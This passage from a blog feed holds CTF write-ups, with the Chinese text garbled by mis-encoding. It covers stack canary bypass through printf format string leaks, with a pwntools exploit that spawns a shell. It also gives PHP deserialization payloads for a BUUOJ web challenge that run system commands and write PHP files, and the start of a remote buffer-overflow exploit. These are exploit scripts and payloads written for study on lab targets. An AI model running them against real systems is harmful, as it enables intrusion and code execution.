        <content type="html"><![CDATA[<h3 id="0x-01-Canaryä¿æŠ¤åŸç†åŠç»•è¿‡"><a href="#0x-01-Canaryä¿æŠ¤åŸç†åŠç»•è¿‡" class="headerlink" title="0x 01 Canaryä¿æŠ¤åŸç†åŠç»•è¿‡"></a>0x 01 Canaryä¿æŠ¤åŸç†åŠç»•è¿‡</h3><p>canaryæ˜¯ä¸€ç§ç”¨æ¥é˜²æŠ¤æ ˆæº¢å‡ºçš„ä¿æŠ¤æœºåˆ¶ã€‚å…¶åŸç†æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°çš„å…¥å£å¤„ï¼Œå…ˆä»fs/gså¯„å­˜å™¨ä¸­å–å‡ºä¸€ä¸ª4å­—èŠ‚(eax)æˆ–è€…8å­—èŠ‚(rax)çš„å€¼å­˜åˆ°æ ˆä¸Šï¼Œå½“å‡½æ•°ç»“æŸæ—¶ä¼šæ£€æŸ¥è¿™ä¸ªæ ˆä¸Šçš„å€¼æ˜¯å¦å’Œå­˜è¿›å»çš„å€¼ä¸€è‡´ã€‚é€šè¿‡æ³„éœ²å‡ºcanaryè¿›è¡Œç»•è¿‡ã€‚</p><img src="/2020/03/20/Canary%E4%BF%9D%E6%8A%A4%E5%8F%8A%E7%AA%81%E7%A0%B4/image-20200119205446678.png" style="zoom:50%;"><h3 id="0x-02-ä¾‹å­åˆ†æ"><a href="#0x-02-ä¾‹å­åˆ†æ" class="headerlink" title="0x 02 ä¾‹å­åˆ†æ"></a>0x 02 ä¾‹å­åˆ†æ</h3><p>æºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0,str,0x50);</span><br><span class="line">    printf(&quot;My name is %s.&quot;); &#x2F;&#x2F;printfæœŸå¾…ä¸‹ä¸€ä¸ªå‚æ•°ï¼Œè€Œæˆ‘ä»¬åªä¼ äº†ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯printfå¹¶ä¸çŸ¥é“ã€‚ä¼šç»§ç»­å‘é«˜åœ°å€å–å››å­—èŠ‚å½“æˆä¸‹ä¸€ä¸ªå‚æ•°</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ±‡ç¼–ä»£ç ï¼šï¼ˆæ·»åŠ Canaryä¿æŠ¤ç¼–è¯‘ç»“æœï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x0804849b &lt;+0&gt;:lea    ecx,[esp+0x4]    &#x2F;&#x2F;ä¿æŠ¤espï¼Œåœ°å€ä¸­å­˜å‚¨çš„è¿”å›åœ°å€æ•°æ®æ²¡æœ‰å˜</span><br><span class="line">0x0804849f &lt;+4&gt;:and    esp,0xfffffff0   &#x2F;&#x2F;å†…å­˜å¯¹é½</span><br><span class="line">0x080484a2 &lt;+7&gt;:push   DWORD PTR [ecx-0x4]  &#x2F;&#x2F;ä¿æŠ¤esp</span><br><span class="line">0x080484a5 &lt;+10&gt;:push   ebp</span><br><span class="line">0x080484a6 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">0x080484a8 &lt;+13&gt;:push   ecx</span><br><span class="line">0x080484a9 &lt;+14&gt;:sub    esp,0x34</span><br><span class="line">0x080484ac &lt;+17&gt;:mov    eax,gs:0x14   &#x2F;&#x2F;ä»gs:0x14çš„ä½ç½®å–å‡ºcarryï¼Œå¤åˆ¶ç»™eaxå¯„å­˜å™¨</span><br><span class="line">0x080484b2 &lt;+23&gt;:mov    DWORD PTR [ebp-0xc],eax   &#x2F;&#x2F;æ’å…¥åˆ°ebpå‰é¢</span><br><span class="line">0x080484b5 &lt;+26&gt;:xor    eax,eax</span><br><span class="line">0x080484b7 &lt;+28&gt;:sub    esp,0x4</span><br><span class="line">0x080484ba &lt;+31&gt;:push   0x50</span><br><span class="line">0x080484bc &lt;+33&gt;:lea    eax,[ebp-0x2c]</span><br><span class="line">0x080484bf &lt;+36&gt;:push   eax</span><br><span class="line">0x080484c0 &lt;+37&gt;:push   0x0</span><br><span class="line">0x080484c2 &lt;+39&gt;:call   0x8048350 &lt;read@plt&gt;</span><br><span class="line">0x080484c7 &lt;+44&gt;:add    esp,0x10</span><br><span class="line">0x080484ca &lt;+47&gt;:sub    esp,0xc</span><br><span class="line">0x080484cd &lt;+50&gt;:push   0x8048580</span><br><span class="line">0x080484d2 &lt;+55&gt;:call   0x8048360 &lt;printf@plt&gt;</span><br><span class="line">0x080484d7 &lt;+60&gt;:add    esp,0x10</span><br><span class="line">0x080484da &lt;+63&gt;:mov    eax,0x0</span><br><span class="line">0x080484df &lt;+68&gt;:mov    edx,DWORD PTR [ebp-0xc]   &#x2F;&#x2F;å–å‡ºcarryä¸gs:0x14è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line">0x080484e2 &lt;+71&gt;:xor    edx,DWORD PTR gs:0x14</span><br><span class="line">0x080484e9 &lt;+78&gt;:je     0x80484f0 &lt;main+85&gt;</span><br><span class="line">0x080484eb &lt;+80&gt;:call   0x8048370 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x080484f0 &lt;+85&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x080484f3 &lt;+88&gt;:leave  </span><br><span class="line">0x080484f4 &lt;+89&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">0x080484f7 &lt;+92&gt;:ret</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨è¾“å‡ºæ ¼å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - åè¿›åˆ¶ - è¾“å‡ºåè¿›åˆ¶æ•´æ•°</span><br><span class="line">%s - å­—ç¬¦ä¸² - ä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²</span><br><span class="line">%x - åå…­è¿›åˆ¶ - è¾“å‡ºåå…­è¿›åˆ¶æ•°</span><br><span class="line">%c - å­—ç¬¦ - è¾“å‡ºå­—ç¬¦</span><br><span class="line">%p - æŒ‡é’ˆ - æŒ‡é’ˆåœ°å€</span><br><span class="line">%n - åˆ°ç›®å‰ä¸ºæ­¢æ‰€å†™çš„å­—ç¬¦æ•°</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œ%så’Œ%xçš„åŒºåˆ«ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     Stackframe</span><br><span class="line">+------------------+</span><br><span class="line">|   parameter1     |  &lt;- ESP  (pointer to &quot;%s&quot; or &quot;%x&quot;)</span><br><span class="line">+------------------+</span><br><span class="line">|   0xdeadbeef     |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p>  å½“parameter1ä¸º%sçš„åœ°å€æ—¶ï¼Œprintfä¼šå°†0xdeadbeefä½œä¸ºåœ°å€ï¼Œå–0xdeadbeefæŒ‡å‘çš„å­—ç¬¦ä¸²å¡«å…¥%sçš„ä½ç½®å¹¶è¾“å‡ºï¼›å½“parameter1ä¸º%xçš„åœ°å€æ—¶ï¼Œprintfä¼šç›´æ¥å°†0xdeadbeefå¡«å…¥%xçš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥è¾“å‡º0xdeadbeefã€‚</p><ul><li>ä¾‹å­äºŒ</li></ul><p>æºä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">    char str[0x20];</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">    printf(str);</span><br><span class="line">    read(0, str, 0x50);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦è°ƒè¯•ç¨‹åºï¼Œè®©ç¨‹åºæ–­åœ¨printfã€‚æŸ¥æ‰¾canaryè·ç¦»printfç¬¬ä¸€ä¸ªå‚æ•°æœ‰å¤šè¿œï¼Œå‡½æ•°æ–­åœ¨printfåæ ˆä¸­æ•°æ®å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ stack 0x28</span><br><span class="line">0000| 0xffffd620 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0004| 0xffffd624 --&gt; 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0008| 0xffffd628 --&gt; 0x50 (&#39;P&#39;)</span><br><span class="line">0012| 0xffffd62c --&gt; 0x804828a (&quot;__libc_start_main&quot;)</span><br><span class="line">0016| 0xffffd630 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd634 --&gt; 0xffffd6d4 --&gt; 0xb21e8355 </span><br><span class="line">0024| 0xffffd638 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0028| 0xffffd63c (&quot;aaa\n\377\377\377\377&#x2F;&quot;)</span><br><span class="line">0032| 0xffffd640 --&gt; 0xffffffff </span><br><span class="line">0036| 0xffffd644 --&gt; 0x2f (&#39;&#x2F;&#39;)</span><br><span class="line">0040| 0xffffd648 --&gt; 0xf7e0fdc8 --&gt; 0x2b76 (&#39;v+&#39;)</span><br><span class="line">0044| 0xffffd64c --&gt; 0xf7fd31b0 --&gt; 0xf7e03000 --&gt; 0x464c457f </span><br><span class="line">0048| 0xffffd650 --&gt; 0x8000 </span><br><span class="line">0052| 0xffffd654 --&gt; 0xf7fb5000 --&gt; 0x1b1db0 </span><br><span class="line">0056| 0xffffd658 --&gt; 0xf7fb3244 --&gt; 0xf7e1b020 (&lt;_IO_check_libio&gt;:)</span><br><span class="line">0060| 0xffffd65c --&gt; 0xc4793000 </span><br><span class="line">0064| 0xffffd660 --&gt; 0x1 </span><br><span class="line">0068| 0xffffd664 --&gt; 0x1 </span><br><span class="line">0072| 0xffffd668 --&gt; 0xffffd688 --&gt; 0x0 </span><br><span class="line">0076| 0xffffd66c --&gt; 0x804857b (&lt;main+33&gt;:mov    eax,0x0)</span><br><span class="line">0080| 0xffffd670 --&gt; 0x1 </span><br><span class="line">0084| 0xffffd674 --&gt; 0xffffd734 --&gt; 0xffffd86b (&quot;&#x2F;home&#x2F;hw&#x2F;æ¡Œé¢&#x2F;PWN&#x2F;02&quot;)</span><br><span class="line">0088| 0xffffd678 --&gt; 0xffffd73c --&gt; 0xffffd882 (&quot;TERM&#x3D;xterm-256color&quot;)</span><br><span class="line">0092| 0xffffd67c --&gt; 0xc4793000 </span><br><span class="line">0096| 0xffffd680 --&gt; 0xf7fb53dc --&gt; 0xf7fb61e0 --&gt; 0x0</span><br></pre></td></tr></table></figure><p>æ‰“å°è¾“å‡ºä¸€ä¸‹carryçš„ä¿¡æ¯çš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p $ebp-0xc</span><br><span class="line">$2 &#x3D; (void *) 0xffffd65c</span><br></pre></td></tr></table></figure><p>è·ç¦»ç¬¬ä¸€ä¸ªå‚æ•°æœ‰60å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯15ä¸ªå‚æ•°çš„é•¿åº¦ï¼Œæ‰€ä»¥è¦è¯»canaryæˆ‘ä»¬çš„payloadä¸º%15xã€‚</p><blockquote><p><strong>1.ä»»æ„åœ°å€è¯»ï¼š</strong></p><p>æ ¹æ®å…ˆå‰çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæœ€åä¸€ä¸ª%08xæ¢æˆ%så°±å¯ä»¥è¯»å–0x61616161åœ°å€çš„æ•°æ®ï¼Œæ³¨æ„è¿™ä¸ª0x61616161æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å†…å®¹ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å‰å››ä¸ªå­—èŠ‚ä¸”è¿™å››ä¸ªå­—èŠ‚å°±æ˜¯è¯»å–çš„åœ°å€ã€‚æ‰€ä»¥ï¼Œå¯ä»¥é€šè¿‡æ›¿æ¢è¿™ä¸ªpayloadçš„å‰å››ä¸ªå­—èŠ‚å®Œæˆä»»æ„åœ°å€è¯»ã€‚</p><p>è¿™ä¸ªpayloadä¹Ÿå¯ä»¥ç®€åŒ–ä¸ºaaaa%7$sï¼Œè¿™é‡Œçš„7$çš„æ„æ€å°±æ˜¯å–printfçš„ç¬¬ä¸ƒä¸ªå‚æ•°(0x61616161)ï¼Œå¦‚æœè¿™é‡Œè¦ç”¨ç­‰å®½è¾“å‡ºçš„è¯payloadå°±å˜æˆè¿™æ ·äº†aaaa%7$08xï¼Œç»“æœä¼šè¾“å‡ºaaaa61616161ã€‚</p><p><strong>2.ä»»æ„åœ°å€å†™ï¼š</strong></p><p>æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹%nçš„ä½œç”¨ã€‚%næ˜¯å°†è¾“å‡ºçš„å­—ç¬¦çš„ä¸ªæ•°å†™å…¥åˆ°å†…å­˜ä¸­ã€‚</p><p>æ ¹æ®ä¸Šè¿°çŸ¥è¯†ï¼Œå½“payloadä¸ºaaaa%7$næ—¶ï¼Œè¾“å‡ºçš„å­—ç¬¦æ•°é‡ä¸º4ï¼Œç¨‹åºä¼šå°†4å†™å…¥0x61616161æŒ‡å‘çš„å†…å­˜ä¸­ã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å†™æ›´å¤§çš„æ•°å°±å¾—ç”¨ç­‰å®½è¾“å‡ºæ¥å®ç°äº†ã€‚å‡è®¾ï¼Œæˆ‘ä»¬éœ€è¦å‘0x61616161å†™å…¥100ï¼Œåˆ™payloadå°±å˜æˆäº†aaaa%7$0100nã€‚</p><p>ä»»æ„åœ°å€å†™è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬è¦å†™ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œæ¯”å¦‚è¦å°†0x8048320å†™å…¥0x61616161ï¼Œè¿™ä¸ª16è¿›åˆ¶å¯¹åº”çš„åè¿›åˆ¶æ•°ä¸º134513440ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦åœ¨è¾“å‡º134513440ä¸ªå­—ç¬¦ã€‚ä¸ç”¨å¤šæƒ³ï¼Œç¨‹åºè‚¯å®šä¼šå´©æºƒã€‚</p><p>å¦‚æœé‡åˆ°è¿™ç§æƒ…å†µæ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥é€šè¿‡%hnæ¥ä¸¤å­—èŠ‚ä¸¤å­—èŠ‚å†™å…¥ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†0x8048320æ‹†åˆ†ä¸ºé«˜ä¸¤å­—èŠ‚0x804å’Œä½ä¸¤å­—èŠ‚0x8320ï¼Œå°†0x804ä¹Ÿå°±æ˜¯åè¿›åˆ¶2052å†™å…¥0x61616161 â€“ 0x61616162ï¼›å°†0x8320ä¹Ÿå°±æ˜¯åè¿›åˆ¶33568å†™å…¥0x61616163 â€“  0x61616164ã€‚åˆ†ä¸¤æ¬¡å†™å…¥å°±å¯ä»¥å®Œæˆå¤§æ•°çš„å†™å…¥äº†ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/85203" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85203</a></p></blockquote><p>æ³„éœ²carryæ•°æ®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@hw-virtual-machine:&#x2F;home&#x2F;hw&#x2F;æ¡Œé¢&#x2F;PWN# .&#x2F;02</span><br><span class="line">%15$08x</span><br><span class="line">cdb3e300</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š0xffffd63cåœ°å€æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°æ•°æ®çš„å®é™…åœ°å€ï¼Œ0xffffd65cæ˜¯carryçš„åœ°å€ï¼Œåç§»é‡æ˜¯32å­—èŠ‚ï¼Œ0xffffd668æ˜¯å‡½æ•°çš„è¿”å›åœ°å€ï¼Œåç§»é‡æ˜¯12ä¸ªå­—èŠ‚</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;c&quot;)</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;c&quot;)</span><br><span class="line">shell_addr &#x3D; elf.symbols[&quot;exploit&quot;]</span><br><span class="line">payload &#x3D; &quot;%15$08x&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ret &#x3D; p.recv()</span><br><span class="line">canary &#x3D; ret[:8]</span><br><span class="line">print canary</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; (canary.decode(&quot;hex&quot;))[::-1]   # å°ç«¯æ¨¡å¼åè½¬</span><br><span class="line">payload +&#x3D; &#39;a&#39; * 12</span><br><span class="line">payload +&#x3D; p32(shell_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://blog.csdn.net/ddllrrbb/article/details/88854492" target="_blank" rel="noopener">å¤§å°ç«¯çš„åˆ¤æ–­åŠè½¬æ¢</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> pwnåŸºç¡€çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Canaryä¿æŠ¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuojæ–°æ˜¥WEBçº¢åŒ…é¢˜</title>
      <link href="/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/"/>
      <url>/2020/03/20/buuoj%E6%96%B0%E6%98%A5WEB%E7%BA%A2%E5%8C%85%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-é¢˜ç›®åˆ†æ"><a href="#0x-01-é¢˜ç›®åˆ†æ" class="headerlink" title="0x 01 é¢˜ç›®åˆ†æ"></a>0x 01 é¢˜ç›®åˆ†æ</h3><p>é¢˜ç›®æ”¹ç¼–è‡ª EIS 2019 çš„ ezpopï¼Œä¸åŸé¢˜ä¸åŒçš„æ˜¯åŠ äº†ä¸‹é¢è¿™ä¸ªï¼Œå¯¹æ–‡ä»¶åæœ‰æ‰€æ§åˆ¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public function getCacheKey(string $name): string &#123;</span><br><span class="line">        &#x2F;&#x2F; ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span><br><span class="line">        $cache_filename &#x3D; $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;</span><br><span class="line">        if(substr($cache_filename, -strlen(&#39;.php&#39;)) &#x3D;&#x3D;&#x3D; &#39;.php&#39;) &#123;</span><br><span class="line">            die(&#39;?&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return $cache_filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸé¢˜è§£é¢˜æŠ¥å‘Šå‚è€ƒï¼š<a href="https://www.jianshu.com/p/763427ea0e4b" target="_blank" rel="noopener">https://www.jianshu.com/p/763427ea0e4b</a></p><h3 id="0x-02-è§£é¢˜æ–¹æ³•ä¸€"><a href="#0x-02-è§£é¢˜æ–¹æ³•ä¸€" class="headerlink" title="0x 02 è§£é¢˜æ–¹æ³•ä¸€"></a>0x 02 è§£é¢˜æ–¹æ³•ä¸€</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;abc&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;system&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line">$testA &#x3D; new A($testB, &quot;miao&quot;);</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">$testA-&gt;cache &#x3D; [&#39;aaq&#39; &#x3D;&gt; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;];</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>$serizlize</code> æ˜¯å¯æ§çš„ï¼Œ<code>$data</code> ä¼šè¢«è½¬æ¢æˆjson,åˆ©ç”¨systemæ‰§è¡Œå‘½ä»¤ï¼Œæœ€åç›¸å½“äºæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[&#123;&quot;aaq&quot;:&quot;&#96;cat \&#x2F;flag &gt; .\&#x2F;flag.php&#96;&quot;&#125;,true]&quot;</span><br></pre></td></tr></table></figure><p>åœ¨shellé‡Œé¢ï¼Œçš„ä¼˜å…ˆçº§æ˜¯é«˜äºâ€çš„ï¼Œæ‰€ä»¥ä¼šå…ˆæ‰§è¡Œ<code>cat /flag &gt; ./flag.php</code>ç„¶åå†å°†æ‰§è¡Œç»“æœæ‹¼æ¥æˆä¸€ä¸ªæ–°çš„å‘½ä»¤,å‚è€ƒ <a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194036</a></p><h3 id="0x-03-è§£é¢˜æ–¹æ³•äºŒ"><a href="#0x-03-è§£é¢˜æ–¹æ³•äºŒ" class="headerlink" title="0x 03 è§£é¢˜æ–¹æ³•äºŒ"></a>0x 03 è§£é¢˜æ–¹æ³•äºŒ</h3><p>å¯¹äºå‰é¢çš„éšæœºå€¼ï¼Œä½¿ç”¨/../å³å¯æˆªæ–­ï¼Œåé¢å³å¯è¿½åŠ å†™ä»»æ„æ–‡ä»¶ã€‚</p><p>äºæ˜¯å…ˆå†™ä¸€ä¸ª .user.iniï¼Œç„¶åå†™ä¸€ä¸ª .jpg é‡Œé¢å¸¦é©¬ï¼Œä½¿å…¶è¿½åŠ åˆ°å…¶ä»– php åé¢ä½œä¸º php æ‰§è¡Œå³å¯ã€‚</p><p>å‚è§ <a href="http://althims.com/2020/01/29/buu-new-year/" target="_blank" rel="noopener">http://althims.com/2020/01/29/buu-new-year/</a></p><h3 id="0x-04-è§£é¢˜æ–¹æ³•ä¸‰"><a href="#0x-04-è§£é¢˜æ–¹æ³•ä¸‰" class="headerlink" title="0x 04 è§£é¢˜æ–¹æ³•ä¸‰"></a>0x 04 è§£é¢˜æ–¹æ³•ä¸‰</h3><p>å¯¹äºå°¾éƒ¨ .php çš„é™åˆ¶ï¼Œå¯ä½¿ç”¨è¿½åŠ  /. æ¥ç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$testB &#x3D; new B();</span><br><span class="line">$testA &#x3D; new A($testB, $key &#x3D; &#39;&#x2F;..&#x2F;miao1.php&#x2F;.&#39;);</span><br><span class="line">$testA-&gt;complete &#x3D; true;</span><br><span class="line">$testA-&gt;autosave &#x3D; false;</span><br><span class="line">&#x2F;&#x2F; &lt;?php phpinfo();?\&gt;</span><br><span class="line">$testA-&gt;cache &#x3D; array(&quot;PD9waHAgcGhwaW5mbygpOz8+&quot;&#x3D;&gt;&quot;&quot;);</span><br><span class="line">$testB-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;&#39;;</span><br><span class="line">$testB-&gt;options[&#39;serialize&#39;] &#x3D; &#39;strval&#39;;</span><br><span class="line">$testB-&gt;options[&#39;data_compress&#39;] &#x3D; false;</span><br><span class="line">$testB-&gt;options[&#39;expire&#39;] &#x3D; &quot;aaa\n&quot;;</span><br><span class="line">$testB-&gt;writeTimes &#x3D; 0;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($testA)).&quot;\n&quot;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ-pwné¢˜è§£ï¼ˆä¸€ï¼‰</title>
      <link href="/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/20/BUUOJ-pwn%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-rip"><a href="#0x-01-rip" class="headerlink" title="0x 01 rip"></a>0x 01 rip</h3><p>å­˜åœ¨åé—¨å‡½æ•°funï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºfunåœ°å€</p><p>exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29406)</span><br><span class="line">payload&#x3D;&#39;a&#39;*23+p64(0x401186)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 